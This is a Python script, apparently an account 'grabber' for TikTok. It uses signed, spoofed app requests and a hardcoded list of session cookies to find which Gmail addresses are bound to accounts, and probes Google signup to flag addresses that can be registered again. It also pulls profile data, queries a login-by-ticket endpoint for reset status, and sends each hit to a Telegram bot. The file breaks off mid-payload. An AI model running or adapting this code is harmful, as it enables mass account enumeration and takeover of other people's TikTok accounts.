import requests
import threading
import random
import datetime
from user_agent import generate_user_agent as x
from SignerPy import sign, get
import os
import sys
import ST4, secrets
import time
import uuid
from urllib.parse import urlencode
from os import urandom
import binascii
from os import system
import hsopyt
import string
import time, hashlib
import string, secrets
from urllib.parse import urlencode
import random, uuid
import json
import binascii
import os
from SignerPy import sign, get
from random import choice, randrange, randint
from os import urandom
from threading import Thread as F400
from concurrent.futures import ThreadPoolExecutor as F300
import datetime
import sys
import re

from ST4 import HOTMAIL as nothing

# تعريف الألوان - فقط بنفسجي وسمائي مع خط عريض
PURPLE = '\033[95m'      # بنفسجي
CYAN = '\033[96m'        # سمائي
BOLD = '\033[1m'         # خط عريض
RESET = '\033[0m'        # إعادة تعيين

class HSO:
    def __init__(self):
        self.logo = f'''
{BOLD}{PURPLE}╭━━━┳━━━╮{RESET}
{BOLD}{PURPLE}┃╭━╮┃╭━╮┃{RESET}
{BOLD}{PURPLE}┃╰━╯┃╰━━╮{RESET}
{BOLD}{PURPLE}┃╭━━┻━━╮┃{RESET}
{BOLD}{PURPLE}┃┃╱╱┃╰━╯┃{RESET}
{BOLD}{PURPLE}╰╯╱╱╰━━━╯{RESET}
{BOLD}{CYAN}ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ{RESET}
{BOLD}{PURPLE}DEV :: @p7s7s ~ PS {RESET}
{BOLD}{CYAN}trust » t.me/ali313eme8{RESET}
{BOLD}{CYAN}ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ{RESET}
'''
        self.id = input(f"{BOLD}{PURPLE}[ + ] id : {RESET}")
        self.token = input(f"{BOLD}{PURPLE}[ + ] Token  : {RESET}")
        os.system("cls" if os.name == "nt" else "clear")
        self.hit = 0
        self.gt = 0
        self.bt = 0
        self.ge = 0
        self.be = 0
        self.secret = secrets.token_hex(16)
        self.ses = requests.Session()
        self.q = self.logo
        for i in self.q.splitlines():
            print(i)
            time.sleep(0.05)
        self.name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(random.randrange(5, 10)))
        self.keyword = random.choice([
            'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
            '1234567890azertyuiopmlkjhgfdsqwxcvbn',
            'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
            'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
            'ABCÇDEFGĞHIİJKLMNOÖPRSŞTÜVYZ',
            'АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ',
            'अआइईउऊऋएऐओऔकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',
            'ابپتثجچحخدذرزژسشصضطظعغفقکگلمنوهی'
        ])
        self.birthday = random.randrange(1980, 2010), random.randrange(1, 12), random.randrange(1, 28)
        self.dev = "@FFNZZ"
        self.select()

    def select(self):
        try:
            self.sec = 3
        except Exception as e:
            print(e)
            exit("Error Input ")
        if self.sec == 3:
            self.file = input(f"{BOLD}{PURPLE}File Name > {RESET}")
            try:
                self.max = int(input(f"{BOLD}{PURPLE}input Numper For Threading 1-50 : {RESET}"))
            except:
                exit("error Number  ")
            os.system("cls" if os.name == "nt" else "clear")
            for i in self.q.splitlines():
                print(i)
                time.sleep(0.05)
            self.admin_gmail()

    def signn(self, params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2, platform: int = 19, unix: int = None):
        x_ss_stub = hashlib.md5(payload.encode('utf-8')).hexdigest() if payload != None else None
        data = payload
        if not unix:
            unix = int(time.time())
        return hsopyt.Gorgon(params, unix, payload, cookie).get_value() | {"x-ladon": hsopyt.Ladon.encrypt(unix, license_id, aid), "x-argus": hsopyt.Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id, sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version)}

    def sign2(self, params: str, payload: str or None = None, sec_device_id: str = '', cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = 'v05.00.06-ov-android', sdk_version: int = 167775296, platform: int = 0, unix: float = None):
        x_ss_stub = hashlib.md5(payload.encode('utf-8')).hexdigest() if payload != None else None
        if not unix:
            unix = time.time()
        return hsopyt.Gorgon(params, unix, payload, cookie).get_value() | {
            'content-length': str(len(payload)),
            'x-ss-stub': x_ss_stub.upper(),
            'x-ladon': hsopyt.Ladon.encrypt(int(unix), license_id, aid),
            'x-argus': hsopyt.Argus.get_sign(params, x_ss_stub, int(unix),
                platform=platform,
                aid=aid,
                license_id=license_id,
                sec_device_id=sec_device_id,
                sdk_version=sdk_version_str,
                sdk_version_int=sdk_version)
        }

    def rest(self, username):
        params = {'_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632", 'cdid': str(uuid.uuid4()), 'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1), 'iid': str(random.randint(1, 10**19)), 'device_id': str(random.randint(1, 10**19)), 'openudid': str(binascii.hexlify(os.urandom(8)).decode())}
        device_id = params["device_id"]
        iid = params["iid"]
        cdid = params["cdid"]
        openudid = params["openudid"]
        _rticket = params["_rticket"]
        ts = params["ts"]
        params = {'_rticket': _rticket, 'ab_version': '37.8.5', 'ac': 'WIFI', 'ac2': 'wifi', 'account_param': username, 'aid': '1233', 'app_language': 'ar', 'app_name': 'musical_ly', 'app_type': 'normal', 'build_number': '37.8.5', 'carrier_region': 'US', 'carrier_region_v2': '460', 'cdid': cdid, 'channel': 'googleplay', 'cronet_version': '75b93580_2024-11-28', 'device_brand': 'rockchip', 'device_id': device_id, 'device_platform': 'android', 'device_type': 'rk3588s_q', 'dpi': '320', 'fixed_mix_mode': '1', 'host_abi': 'arm64-v8a', 'iid': iid, 'is_pad': '0', 'language': 'ar', 'last_install_time': '1745162892', 'locale': 'ar', 'manifest_version_code': '2023708050', 'mix_mode': '1', 'op_region': 'US', 'openudid': openudid, 'os': 'android', 'os_api': '29', 'os_version': '10', 'region': 'IQ', 'request_tag_from': 'h5', 'resolution': '720%2A1280', 'rrb': '%7B%7D', 'scene': '4', 'ssmix': 'a', 'support_webview': '1', 'sys_region': 'IQ', 'timezone_name': 'Europe%2FAmsterdam', 'timezone_offset': '3600', 'ts': '1745163105', 'ttnet_version': '4.2.210.6-tiktok', 'uoo': '0', 'update_version_code': '2023708050', 'use_store_region_cookie': '1', 'version_code': '370805', 'version_name': '37.8.5', 'app_version': '32.9.5'}
        m = self.sign2(urlencode(params), '', "AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)), None, 1233)
        response = requests.post("https://api16-normal-c-alisg.tiktokv.com/passport/account_lookup/username/", params=params, headers={'User-Agent': 'com.zhiliaoapp.musically/2023708050 (Linux; U; Android 10; ar_IQ; rk3588s_q; Build/QD4A.200805.003; Cronet/TTNetVersion:75b93580 2024-11-28 QuicVersion:ef6c341e 2024-11-14)', 'Accept': "application/json, text/plain, */*", 'x-argus': m["x-argus"], 'x-gorgon': m["x-gorgon"], 'x-khronos': m["x-khronos"], 'x-ladon': m["x-ladon"]})
        print(response.text)
        result = {"status": "Not Found"}

        if 'passport_ticket' in response.text:
            ticket = (response.json()['data']['accounts'][0]['passport_ticket'])
            params = {'_rticket': _rticket, 'ab_version': '37.8.5', 'ac': 'WIFI', 'ac2': 'wifi', 'aid': '1233', 'app_language': 'ar', 'app_name': 'musical_ly', 'app_type': 'normal', 'build_number': '37.8.5', 'carrier_region': 'US', 'carrier_region_v2': '460', 'cdid': cdid, 'channel': 'googleplay', 'cronet_version': '75b93580_2024-11-28', 'device_brand': 'rockchip', 'device_id': device_id, 'device_platform': 'android', 'device_type': 'rk3588s_q', 'dpi': '320', 'host_abi': 'arm64-v8a', 'iid': iid, 'is_pad': '0', 'language': 'ar', 'last_install_time': '1745162892', 'locale': 'ar', 'manifest_version_code': '2023708050', 'op_region': 'US', 'openudid': openudid, 'os': 'android', 'os_api': '29', 'os_version': '10', 'passport_ticket': ticket, 'region': 'IQ', 'request_tag_from': 'h5', 'ssmix': 'a', 'support_webview': '1', 'sys_region': 'IQ', 'timezone_name': 'Europe%2FAmsterdam', 'timezone_offset': '3600', 'ts': '1745163107', 'ttnet_version': '4.2.210.6-tiktok', 'uoo': '0', 'update_version_code': '2023708050', 'use_store_region_cookie': '1', 'version_code': '370805', 'version_name': '37.8.5', 'app_version': '32.9.5'}
            m = self.sign2(urlencode(params), '', "AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)), None)
            response = requests.post("https://api16-normal-c-alisg.tiktokv.com/passport/user/login_by_passport_ticket/", params=params, headers={'User-Agent': "com.zhiliaoapp.musically/2023708050 (Linux; U; Android 10; ar_IQ; rk3588s_q; Build/QD4A.200805.003; Cronet/TTNetVersion:75b93580 2024-11-28 QuicVersion:ef6c341e 2024-11-14)", 'Accept': "application/json, text/plain, */*", 'x-argus': m["x-argus"], 'x-gorgon': m["x-gorgon"], 'x-khronos': m["x-khronos"], 'x-ladon': m["x-ladon"]})
            print(response.text)
            try:
                kl = json.loads(response.headers.get('X-Tt-Verify-Idv-Decision-Conf'))['extra'][0]['info']
                result = {"status": kl}
            except Exception as e:
                result = {"status": "Try Again"}

        return result

    def info(self, email):
        self.hit += 1

        user = email.split("@")[0]
        patre = {
            "Host": "www.tiktok.com",
            "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"99\", \"Google Chrome\";v\u003d\"99\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; Plume L2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
            "sec-fetch-site": "none",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "accept-language": "en-US,en;q\u003d0.9,ar-DZ;q\u003d0.8,ar;q\u003d0.7,fr;q\u003d0.6,hu;q\u003d0.5,zh-CN;q\u003d0.4,zh;q\u003d0.3"
        }
        tikinfo = requests.get(f'https://www.tiktok.com/@{user}', headers=patre).text
        try:
            getting = str(tikinfo.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
            id = str(getting.split('id":"')[1]).split('",')[0]
            name = str(getting.split('nickname":"')[1]).split('",')[0]
            bio = str(getting.split('signature":"')[1]).split('",')[0]
            country = str(getting.split('region":"')[1]).split('",')[0]
            private = str(getting.split('privateAccount":')[1]).split(',"')[0]
            followers = str(getting.split('followerCount":')[1]).split(',"')[0]
            following = str(getting.split('followingCount":')[1]).split(',"')[0]
            like = str(getting.split('heart":')[1]).split(',"')[0]
            video = str(getting.split('videoCount":')[1]).split(',"')[0]
            B = bin(int(id))[2:]
            L, BS = 0, ""
            while L < 31:
                BS += B[L]
                L += 1
            Date = datetime.datetime.fromtimestamp(int(BS, 2)).strftime('%Y')

            vipQvip = self.rest(user)

            ff = f"""
> ========================================
> [ TIKTOK GRABBER v1.0 ]
> ========================================
> [*] Hit        = {self.hit}
> [*] Name       = {name}
> [*] Username   = {user}
> [*] Email      = {email}
> [*] ID         = {id}
> [*] Following  = {following}
> [*] Followers  = {followers}
> [*] Likes      = {like}
> [*] Videos     = {video}
> [*] Date       = {Date}
> [*] Private    = {private}
> [*] Flag       = {self.country_code_to_flag(country)}
> [*] Country    = {country}
> [*] Rest Status= {vipQvip['status']}
> ========================================
> [✓] Connection established. 
ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
DEV :: @p7s7s ~ PS 
 trust » t.me/ali313eme8
 ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
"""
            with open("TIKTOK.txt", 'a', encoding="utf-8") as h:
                h.write(ff + "\n")
            # إرسال نص عادي بدون تلوين للبوت
            requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.id}&text=" + str(ff))

        except Exception as e:
            print(e)
            vipQvip = self.rest(user)

            ff = f'''
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    TikTok :: Zero-Day Exploit
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  • Hit ID        : {self.hit}
  • Username      : {user}
  • Email         : {email}
  • VIP Status    : {vipQvip['status']}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  [✓] PS | @p7s7s
          
'''
            with open("TIKTOK - BROKIN.txt", 'a', encoding="utf-8") as h:
                h.write(ff + "\n")
            # إرسال نص عادي بدون تلوين للبوت
            requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.id}&text=" + str(ff))

    def API_CH(self, email):
        cookies = {
            "passport_csrf_token": self.secret,
            "passport_csrf_token_default": self.secret,
            "sessionid": random.choice([
                'a16fa6c5be204caeef3e2db9abf7e54a',
                '4c555f3897daeeaec5d33075aac6e7a5',
                '9ef5dd91a967ac5eb3deaa8e78adf7d4',
                'd08e27df2c75af9276fc4b0f60d72d19',
                'df395f8ac47b3db8e9a8f899ac5937d3',
                '46a8ef281a146aa734c5527148003fe5',
                '7001dc2643f83cf6e72def00fbccfc6f',
                '5081bf0f8e54a1dd28629a50ae0b0e01',
                '3100e89c7b0d70e8a0f41233b28a769c',
                '8d7571beb5a4285e6bccfa4cc6a4d502',
                'd670e72823c751079017ca9a3b21020c',
                'fd61effb1d65a1b01c820361d8228c7c',
                'b6acb99c05b13b9ff866c26ee64a8fa8',
                '4f761f08a724692c9ecb5e7fc54cbea3',
                '2747f4c3d1f3b922f7b86dcd546af8d7',
                'cd4489ef3fe23ddc68ad4454c9cabc41',
                '5a0d6b2ca82d8824852148c22e146910',
                '2ad32b398e15e80e443f922ab4928447',
                '5a4a4c8c746d55a3cae7f32a127513aa',
                'f4ea0fc94454b6a47fafb09a00aeb0e8',
                '6bf28abdc354288b73bf99008f6a361f',
                'df7246019b382003c7d438e2eec3f812',
                'f4fd0301c875e5a5da06c14fd136934c',
                '20f03a3785cbab1d1f242c50a8b2ef21',
                '93bf67de66b6ddff3a75c3aec78e7276',
                '0428ad14102a079e02df973ef9c3ca34',
                'a7a6042fd8bb7aa59496346d9646e46f',
                '525d663adcec79b1601cdfa2125627dc',
                '8100a904b508f86fa19c3b3a2146a979',
                'd972be2b916d7cb7a3e2c534dac73439',
                '30c2b94bf3ddd98952a6f28137250375',
                'fd4cd15633d1ebceccc492d509a9522b',
                '648c1df7cef3ed3bd814c932939ce846',
                '0f2d6256d2252a5cecd575b76009e8c2',
                'bb4cef9ef619cb46f0a45c308c0d1e25',
                '278b94bbb57a92ff23d92c5c52e1d57e',
                '59317ae149b292fa766df9b805d4012e',
                '40035d852d85c40b180d5154dce74e32',
                '572670e81c97c6b16e081ee0243883b5',
                '8a53b9f0b2ad46141f3ef206170ea95f',
                'e54ae478d3928c1980661d3dcc81127e',
                'cec657d01305d24d62ead1ebca1ea0de',
                '1aa7da779bfb34e9adcda9d330242347',
                '0727771a119768c35ddad138ae669ccb',
                'b394eaa0f2376832f1e65701406872b4',
                '1fc1c3d992d806afbb88fb05b3f8b51b',
                '56e02966f4761a361a575db0a32ba2f7',
                '978573dbd8fb062130305da932016754',
                '466efa18c526a080549b97f03305a3a9',
                '1f7b16535d0c8f91d1b0f0d4291726c7',
                'c5a5d59db6c74831c598bbacee8ad25a',
                '2b052a3a01222be0da70fd2849f6f849',
                '18c9b9a235c938b34c1f8c5af3c65eb3',
                '847ce0bac8342d7e63798419c0958268',
                '08d0463c3ea0a3c7ef8f6a8e2e341528',
                '138b138be22630bb46a0dd4d747dc037',
                '6f8fd20e4cfb6af8d68e38284f732269',
                '266d4adf7a9741e20386d77215fe1e1c',
                'f76100b0c36e12ceec7dfedebb50f967',
                'df8419589aec20f583de70c2302a87c5',
                '987b534331cb8fe0426158e4f8f39124',
                '1b1d59bf2bbe2458f5b9287c3b41af22',
                'a7739802b84434c4175225a907bc4df7',
                'aafb7b56836cffdb34d99407f2732e6d',
                '48399b568941080f90b6da6cc0f40b63',
                '9689fb7803f6b4b105e01eda4ab43667',
                '536ae2abec9ed18942939af83296b8ef',
                '40210b4815aa47f3d2cfeb45cf713bea',
                '2aa562d2463d90d723fac8d46b58246c',
                'a2e045e87922de8c8c5339b04cc23adb',
                'ac0e0ddf12a03efdee2da1965064e655',
                '07535b9405b8573072acc54136195a26',
                '61705fae4cd68501d35123df3948656d',
                'e30441f84bebed5ab7fe0c81345b40cc',
                'e9191cf652801115dfd7cc9ce0754492',
                '508ac0dd034d89232616a44f62077380',
                '37d64a41ccfc523b86ba4c6333d2aed7',
                '8d66c48de36a4d3947a452273d3cb677',
                'e29d771a2cf7e0185e47a234d57c1808',
                'e642398744544cd043b0ed8e545303f7',
                'a2d2200d243e5d9eb2309b0a59b9583a',
                'f0aa37632755d7e04da7a77f54ea1519',
                'c517f560947625ed86f27435282dd234',
                'e365a3aa9f85099e53c0ea46f946a567',
                '6324058bdfe884515217ff4acb90073d',
                'ea0d61a88aa3cceb24480d86b9971e2e',
                '7070e4defde4cc89c964dc3526c49dec',
                '65250bcba1797629587c18ce4240a853',
                'bcd76f78aacd79f0e04453901b7b8c65',
                '14f1735a3ac77dc63e18a59bda77edee',
                '220a3c08704e2d0a46c9d9b43854e682',
                '9f0c1ac60c09af5a942bd5df9ae05cdf',
                '90ba1ff26cf1fbca017d44a8be05f41d',
                'fcadc9245d341fc099ba5924100019ed',
                'b6d6d6c88a2405fd025cf56ff7124473',
                '971d7038eb4ee04c7e52209ef7ee5755',
                '98106f1cebb49c19e8e0fa465ea2e979',
                '70b4866e3573692bdda7679e8e5d3939',
                '1c21012aa111369c85ff963c4bc30e29',
                'ff3c13526e2a360a1fefaca8c41e9ce3',
                '8b083ff40730e0cd42eb639598906af5',
                '08af99cac4c0a488bf5500351ad31a50',
                '3384108b77d946ccd84b8c50c0576c56',
                '129eef9249b541845eba16fc14781582',
                '6ac7cb6a6cd03bf5e8e9c5dbe2fa7b71',
                '066a9c1d63023e9697101b18dff58cc5',
            ])
        }
        self.ses.cookies.update(cookies)
        device_brands = ["samsung", "huawei", "xiaomi", "apple", "oneplus"]
        device_types = ["SM-S928B", "P40", "Mi 11", "iPhone12,1", "OnePlus9"]
        regions = ["AE", "IQ", "US", "FR", "DE"]
        languages = ["en"]
        paramss = {
            'passport-sdk-version': "6030790",
            'iid': str(random.randint(1, 10**19)),
            'device_id': str(random.randint(1, 10**19)),
            'ac': "WIFI",
            'channel': "googleplay",
            'aid': "1233",
            'app_name': "musical_ly",
            'version_code': "360505",
            'version_name': "36.5.5",
            'device_platform': "android",
            'os': "android",
            'ab_version': "36.5.5",
            'ssmix': "a",
            'device_type': random.choice(device_types),
            'device_brand': random.choice(device_brands),
            'language': random.choice(languages),
            'os_api': str(random.randint(28, 34)),
            'os_version': str(random.randint(10, 14)),
            'openudid': str(binascii.hexlify(urandom(8)).decode()),
            'manifest_version_code': "2023605050",
            'resolution': "1440*2969",
            'dpi': str(random.choice([420, 480, 532])),
            'update_version_code': "2023605050",
            '_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
            'is_pad': "0",
            'app_type': "normal",
            'sys_region': random.choice(regions),
            'last_install_time': str(random.randint(1600000000, 1700000000)),
            'mcc_mnc': "41820",
            'timezone_name': "Asia/Baghdad",
            'carrier_region_v2': "418",
            'app_language': random.choice(languages),
            'carrier_region': random.choice(regions),
            'ac2': "wifi",
            'uoo': "0",
            'op_region': random.choice(regions),
            'timezone_offset': str(random.randint(0, 14400)),
            'build_number': "36.5.5",
            'host_abi': "arm64-v8a",
            'locale': random.choice(languages),
            'region': random.choice(regions),
            'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
            'cdid': str(uuid.uuid4()),
            'support_webview': "1",
            'reg_store_region': random.choice(regions).lower(),
            'user_selected_region': "0",
            'cront_version': "1c651b66_2024-08-30",
            'ttnet_version': "4.2.195.8-tiktok",
            'use_store_region_cookie': "1",
            'ab_version': '37.8.5'
        }

        params = {'_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632", 'cdid': str(uuid.uuid4()), 'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1), 'iid': str(random.randint(1, 10**19)), 'device_id': str(random.randint(1, 10**19)), 'openudid': str(binascii.hexlify(urandom(8)).decode())}
        _rticket = params["_rticket"]
        device_id = params["device_id"]
        iid = params["iid"]
        cdid = params["cdid"]
        openudid = params["openudid"]
        _rticket = params["_rticket"]
        ts = params["ts"]
        params = {'_rticket': _rticket, 'ab_version': '37.8.5', 'ac': 'WIFI', 'ac2': 'wifi', 'aid': '1233', 'app_language': 'ar', 'app_name': 'musical_ly', 'app_type': 'normal', 'build_number': '37.8.5', 'carrier_region': 'US', 'carrier_region_v2': '460', 'cdid': cdid, 'channel': 'googleplay', 'cronet_version': '75b93580_2024-11-28', 'device_brand': 'rockchip', 'device_id': device_id, 'device_platform': 'android', 'device_type': 'rk3588s_q', 'dpi': '320', 'fixed_mix_mode': '1', 'host_abi': 'arm64-v8a', 'iid': iid, 'is_pad': '0', 'language': 'ar', 'last_install_time': '1745162892', 'locale': 'ar', 'manifest_version_code': '2023708050', 'mix_mode': '1', 'op_region': 'US', 'openudid': openudid, 'os': 'android', 'os_api': '29', 'os_version': '10', 'region': 'IQ', 'request_tag_from': 'h5', 'resolution': '720%2A1280', 'rrb': '%7B%7D', 'scene': '4', 'ssmix': 'a', 'support_webview': '1', 'sys_region': 'IQ', 'timezone_name': 'Europe%2FAmsterdam', 'timezone_offset': '3600', 'ts': '1745163105', 'ttnet_version': '4.2.210.6-tiktok', 'uoo': '0', 'update_version_code': '2023708050', 'use_store_region_cookie': '1', 'version_code': '370805', 'version_name': '37.8.5', 'app_version': '32.9.5'}
        device_type = params["device_type"]
        app_name = "com.zhiliaoapp.musically"
        app_version = f"{random.randint(2000000000, 3000000000)}"
        platform = "Linux"
        os = f"Android {random.randint(10, 15)}"
        locales = ["ar_AE", "en_US", "fr_FR", "es_ES"]
        locale = random.choice(locales)
        device_types = ["phone", "tablet", "tv"]
        device_type = random.choice(device_types)
        build = f"UP1A.{random.randint(200000000, 300000000)}"
        cronet_version = f"{random.randint(10000000, 20000000)}"
        cronet_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}"
        quic_version = f"{random.randint(10000000, 20000000)}"
        quic_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}"
        user_agent = (f"{app_name}/{app_version} ({platform}; U; {os}; {locale}; {device_type}; "
                      f"Build/{build}; Cronet/{cronet_version} {cronet_date}; "
                      f"QuicVersion:{quic_version} {quic_date})")

        m = self.signn(urlencode(params), '', "AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)), None, 1233)
        headers = {
            'User-Agent': user_agent,
            'x-tt-passport-csrf-token': self.secret,
            'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
            'x-argus': m["x-argus"],
            'x-gorgon': m["x-gorgon"],
            'x-khronos': m["x-khronos"],
            'x-ladon': m["x-ladon"]
        }
        try:
            url = "https://api16-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/?passport-sdk-version=0&app_language=en&"
            res = requests.post(url, params=params, headers=headers, data={"email": email}, cookies=cookies).text

            if 'Email is linked to another account. Unlink or try another email.' in res:
                if "@gmail.com" in email:
                    self.check_email(email)
                    self.gt += 1
                    sys.stdout.write(f"\r{BOLD}{PURPLE}[Dev: 𝑃𝑆 ] Hits : {RESET}{self.ge} | {BOLD}{CYAN}False: {RESET}{self.bt} | {BOLD}{PURPLE}No: {RESET}{self.be}")
                    sys.stdout.flush()

            else:
                if "@gmail.com" in email:
                    self.bt += 1
                    sys.stdout.write(f"\r{BOLD}{PURPLE}[Dev: PS] Hits : {RESET}{self.ge} | {BOLD}{CYAN}False: {RESET}{self.bt} | {BOLD}{PURPLE}No: {RESET}{self.be}")
                    sys.stdout.flush()
        except:
            pass

    def country_code_to_flag(self, code):
        if len(code) != 2:
            return "N/L"
        return chr(ord(code[0].upper()) + 127397) + chr(ord(code[1].upper()) + 127397)

    def check_email(self, email):
        if '@' in email:
            email = email.split('@')[0]
        try:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'referer': 'https://accounts.google.com/',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                'x-browser-channel': 'stable',
                'x-browser-copyright': 'Copyright 2024 Google LLC. All rights reserved.',
                'x-browser-year': '2024',
            }

            params = {
                'biz': 'false',
                'continue': 'https://mail.google.com/mail/u/0/',
                'ddm': '1',
                'emr': '1',
                'flowEntry': 'SignUp',
                'flowName': 'GlifWebSignIn',
                'followup': 'https://mail.google.com/mail/u/0/',
                'osid': '1',
                'service': 'mail',
            }

            r = self.ses.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
            tl = r.url.split('TL=')[1]
            s1 = r.text.split('"Qzxixc":"')[1].split('"')[0]
            at = r.text.split('"SNlM0e":"')[1].split('"')[0]
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                'x-goog-ext-391502476-jspb': '["' + s1 + '"]',
                'x-same-domain': '1',
            }

            params = {
                'rpcids': 'E815hb',
                'source-path': '/lifecycle/steps/signup/name',
                'hl': 'en-US',
                'TL': tl,
                'rt': 'c',
            }

            data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(self.name, at)

            r = self.ses.post(
                'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                params=params,
                headers=headers,
                data=data,
            ).text

            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                'x-goog-ext-391502476-jspb': '["' + s1 + '"]',
                'x-same-domain': '1',
            }

            params = {
                'rpcids': 'eOY7Bb',
                'source-path': '/lifecycle/steps/signup/birthdaygender',
                'hl': 'en-US',
                'TL': tl,
                'rt': 'c',
            }
            data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Cf7Nqs-sCAAZfiOnPf4iN_32KOpLfQKL0ADQBEArZ1IBDTUyai2FYax3ViMI2wqBpWShhe-OPRhpMjnm9s14Yu65MknXEBWcyTyF3Jx0pzQAAAeGdAAAAC6cBB7EATZAxrowFF7vQ68oKqx7_sdcR_u8t8CJys-8G4opCIVySwUYaUnm-BovA8aThYLISPNMc8Pl3_B0GnkQJ_W4SIed6l6EcM7QLJ8AXVNAaVgbhsnD7q4lyQnlvR14HRW10oP85EU_bwG1E4QJH1V0KnVS4mIeoqB7zHOuxMuGifv6MB3GghUGTewh0tMN1jaf8yvX804tntlrlxm3OZgCZ2UxgDjUVOKFMv1Y3Txr16jJEJ56-T7qrPCtt6H1kmUvCIl_RDZzbt_sj5OLnbX1UvVA-VgG8-X9AJdvGhCKVhkf3iSkjy6_ZKsZSbsOsMjrm7ggnLdMStIf4AzbJIyMC7q4JMCaDaW_UI9SgquR8mHMpHGRmP7zY-WE47l7uRSpkI6oV93XJZ1zskJsxaDz7sDYHpzEL1RGPnkZU45XkIkwuc1ptU_AiM6SQyoZK7wFnhYxYfDQjSwaC7lOfngr6F2e4pDWkiC96QY4xLr6m2oUoDbyKR3ykccKEECEakFKzS-wSxIt9hK6nw-a9PEpVzhf6uIywZofNCs0KJOhhtv_ReG24DOC6NHX-FweCOkiYtT2sISrm6H8Wr4E89oU_mMWtpnXmhs8PB28SXw42-EdhRPsdcQkgKycOVT_IXwCc4Td9-t7715HP-L2XLk5i05aUrk-sHPPEz8SyL3odOb1SkwQ69bRQHfbPZr858iTDD0UaYWE_Jmb4wlGxYOSsvQ3EIljWDtj69cq3slKqMQu0ZC9bdqEh0p_T9zvsVwFiZThf19JL8PtqlXH5bgoEnPqdSfYbnJviQdUTAhuBPE-O8wgmdwl22wqkndacytncjwGR9cuX